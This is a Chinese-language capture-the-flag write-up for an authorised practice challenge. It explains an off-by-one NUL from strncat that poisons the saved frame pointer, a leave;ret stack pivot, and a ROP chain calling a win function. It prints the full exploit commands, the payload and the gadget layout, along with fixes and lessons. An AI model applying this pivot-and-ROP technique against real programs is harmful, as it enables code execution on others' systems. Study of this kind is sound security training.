# CTF 练习：poison-null-frame（帧指针毒化与栈迁移）

> 平台：CTF² / Daily Hack（Pwn · Medium · 300 分）
> 环境：Kali Linux，明文 TCP 对话终端（`nc`）
> 日期：2026-11-17
> 性质：平台提供的授权靶场

---

## 一、目标

靶机用 Python 模拟 x86-64 栈帧语义。`fill()` 按 `strncat` 语义复制 0x20 字节后追加 `NUL`，恰好毒化保存的 RBP 最低字节，`leave;ret` 触发栈迁移。需要在迁移后的可控栈区布置短 ROP 链，调用 `win` 输出 FLAG。

## 二、环境

```bash
nc direct-ctf2.dasctf.com 25274
```

菜单（明文）：

| 命令 | 作用 |
|---|---|
| `disasm` | 显示 `fill()` 帧布局与 gadget 地址 |
| `leak` | 泄漏上一次 helper() 的旧 RBP |
| `seed <hexaddr> <hexword>` | 向模拟栈写入 8 字节 |
| `trig <hexpayload>` | 触发 fill（写入 payload） |
| `quit` | 退出 |

## 三、侦察

### 3.1 disasm

```
fill():
  push rbp ; mov rbp,rsp ; sub rsp,0x20   ; buf=rbp-0x20 (0x20 bytes)
  ... strncat(buf, src, 0x20) ...          ; writes 0x20 bytes + trailing NUL
  leave ; ret                               ; rsp=rbp; pop rbp; ret
helper(): push rbp; mov rbp,rsp; sub rsp,0x40 ; canary @ rbp-0x8
gadgets: 0x401230 ret | 0x401234 pop rdi;ret | 0x4017a0 win | 0x4017c0 win_alt
```

关键点：
- `buf = rbp-0x20`，**恰好写满 0x20 字节**
- `strncat` 在末尾补的 `NUL` 落在 `[rbp]`，也就是**保存的 RBP 最低字节**
- 结束后 `leave;ret`

### 3.2 leak

```
stale frame value from previous helper() call: rbp=0x7ffd0210
```

### 3.3 诱饵

`win_alt`（0x4017c0）要求 `RSI=0xDEAD`，但 gadget 列表里**没有 `pop rsi`**，无法满足 → 诱饵。

## 四、推导栈迁移

```
旧 RBP = 0x7ffd0210
NUL 覆盖最低字节 0x10 → 0x00
→ 被毒化的 RBP = 0x7ffd0200
```

执行流：

```
fill 的 leave;ret:
  rbp = [fill_rbp] = 0x7ffd0200
  ret 到 helper 的返回地址

helper 的 leave;ret:
  rsp = rbp = 0x7ffd0200
  pop rbp  ← 读 [0x7ffd0200]
  ret      ← 读 [0x7ffd0208]  ← ROP 链从这里开始
```

**结论：ROP 链起始于 `0x7ffd0208`。**

## 五、布置 ROP 链

目标调用：`win(rdi = "flag")`。

| 地址 | 值 | 作用 |
|---|---|---|
| `0x7ffd0208` | `0x401234` | `pop rdi; ret` |
| `0x7ffd0210` | `0x7ffd0300` | RDI 指向 "flag" 字符串 |
| `0x7ffd0218` | `0x4017a0` | `win` |
| `0x7ffd0300` | `0x67616c66` | 小端字节 `66 6c 61 67` = `"flag"`，后接 00 |

写入命令：

```
seed 0x7ffd0208 0x401234
seed 0x7ffd0210 0x7ffd0300
seed 0x7ffd0218 0x4017a0
seed 0x7ffd0300 0x67616c66
```

## 六、触发

`trig` 的 payload 必须**恰好 0x20 字节**，这样 `NUL` 才会落在保存的 RBP 上：

```
trig 4141414141414141414141414141414141414141414141414141414141414141
```

（32 字节 `0x41`，64 个十六进制字符，**不带 `0x` 前缀**）

输出：

```
FLAG=CTF2{...}
```

## 六·五、复盘四问

### 推理链（为什么这么做）

**第 1 步：为什么先 `disasm`**

- 我在想：要利用栈迁移，必须先知道 `buf` 相对 `rbp` 的偏移、保存 RBP 的位置、以及可用 gadget。
- 验证：`disasm` 显示 `buf=rbp-0x20`、`strncat(buf, src, 0x20)`、`leave;ret`。
- 所以：**写入 0x20 字节后，`strncat` 补的 NUL 正好落在 `[rbp]`** —— 单字节覆盖点确认。

**第 2 步：为什么要 `leak`**

- 我在想：NUL 只改最低字节，必须知道原 RBP 才能算出毒化后的地址。
- 验证：`leak` 给出 `rbp=0x7ffd0210`。
- 所以：`0x10 → 0x00`，毒化后 `rbp=0x7ffd0200`（页对齐）。

**第 3 步：为什么迁移落点是 `0x7ffd0208` 而不是 `0x7ffd0200`**

- 我在想：`leave` 语义是 `mov rsp,rbp; pop rbp`，`pop rbp` 会先吃掉 8 字节。
- 验证：按 `leave;ret` 顺序推演。
- 所以：ROP 链从 `0x7ffd0208` 开始，`0x7ffd0200` 那 8 字节是被 `pop` 掉的新 RBP。

**第 4 步：为什么 `trig` 的 payload 必须正好 0x20 字节**

- 我在想：NUL 落在第 0x21 个字节；短了 NUL 落在缓冲区内部，改不到保存的 RBP；长了会被 `strncat` 截断。
- 验证：32 字节 `0x41`（64 个 hex 字符）触发成功。
- 所以：**长度必须精确**，这是本题最容易失手的地方。

**第 5 步：为什么排除 `win_alt`**

- 我在想：`win_alt` 要求 `RSI=0xDEAD`。
- 验证：gadget 列表里没有 `pop rsi`。
- 所以：条件永远不满足 → 诱饵，选 `win`。

**第 6 步：ROP 链为什么这么排**

- 目标：`win(rdi="flag")`。
- `0x7ffd0208: pop rdi; ret` → 下一条被弹进 RDI（`0x7ffd0300`，指向 "flag"）→ 再 `ret` 到 `win`。
- 所以链为：`pop rdi;ret` → `"flag" 地址` → `win`。

### 载荷是怎么来的

- **来源**：手工推导 + 逐条 `seed`。
- **`seed` 的值**：gadget 地址从 `disasm` 抄；字符串地址 `0x7ffd0300` 自己挑（迁移区内可控）；`"flag"` 用 `0x67616c66`（小端 `66 6c 61 67`）。
- **`trig` 的 payload**：32 个 `0x41`，**不带 `0x` 前缀**（64 个 hex 字符）。

### 逐段解释

```
seed 0x7ffd0208 0x401234   # 迁移后 ret 的第一个目标：pop rdi; ret
seed 0x7ffd0210 0x7ffd0300 # 被 pop 进 RDI 的值：指向 "flag"
seed 0x7ffd0218 0x4017a0   # pop rdi;ret 之后的 ret 目标：win()
seed 0x7ffd0300 0x67616c66 # 写入 "flag\0"
trig <32字节 0x41>          # 触发 fill，NUL 毒化 saved RBP
```

### 失败尝试与坑

| 尝试 | 结果 | 原因 |
|---|---|---|
| `trig 0x4141...` | `bad hex` | `trig` 不认 `0x` 前缀，`seed` 才认 |
| payload 写成 31 或 33 字节 | 迁移没发生 | NUL 落点不在 saved RBP |
| ROP 链从 `0x7ffd0200` 开始 | `pop rbp` 吃掉了链头 | 必须从 `0x7ffd0208` 开始 |
| 用 `win_alt` | 条件不满足 | 没有 `pop rsi` |

### 自测

**Q1**：为什么单字节 NUL 就能控制 RSP？
**A**：`strncat` 把 NUL 写到 saved RBP 最低字节，`leave` 时 `mov rsp,rbp` 用的就是被改过的值。

**Q2**：为什么 `trig` 的 payload 不能多也不能少？
**A**：NUL 固定落在第 count+1 字节；只有 count=0x20 时它才落在 saved RBP 上。

**Q3**：ROP 链从哪开始，为什么？
**A**：`0x7ffd0208`；`0x7ffd0200` 的 8 字节会被 `pop rbp` 消耗。

## 七、原理

1. **off-by-one NUL**：`strncat` 的边界计算错误，把结尾 `NUL` 写到了保存的 RBP 上。
2. **帧指针毒化**：只改了最低字节（对齐），但足以把 RBP 指向「上一页」的可控区域。
3. **栈迁移**：`leave;ret` 链式执行时，用被毒化的 RBP 重设 RSP，控制流跳到攻击者布置的 ROP 链。
4. **ROP**：栈不可执行时，用 `pop rdi; ret` + `win` 完成调用。

## 八、修复

| 措施 | 说明 |
|---|---|
| 修正长度计算 | `strncat` 的第 3 参数要减去已写长度，确保结尾 NUL 在缓冲区内 |
| 用 `strlcpy` / `snprintf` | 明确边界，避免 off-by-one |
| 栈保护 | `-fstack-protector-all`，破坏 RBP 会触发 canary 检查 |
| 栈不可执行 | NX/ASLR 常规防护 |
| 代码审计 | 重点检查 `strncat`、`strcpy`、`memcpy` 的长度参数 |

## 九、踩坑

1. **`trig` 不认 `0x` 前缀**：`seed` 接受 `0x`，但 `trig` 报 `bad hex`，去掉前缀即可。
2. **payload 必须正好 0x20 字节**：短了 NUL 落不到 saved RBP，长了会被截断。
3. **迁移落点差 8 字节**：ROP 链从 `0x7ffd0208` 开始，不是 `0x7ffd0200`（后者被 `pop rbp` 吃掉）。
4. **别选 win_alt**：没有 `pop rsi`，条件永远不满足。

## 十、收获

- 亲手推演了一次 `leave;ret` 的栈迁移过程。
- 理解了「单字节 NUL 覆盖」为什么能把栈指针搬走。
- 学会 `seed` + `trig` 这种模拟靶机的调试方式：先侦察、再布置、最后触发。
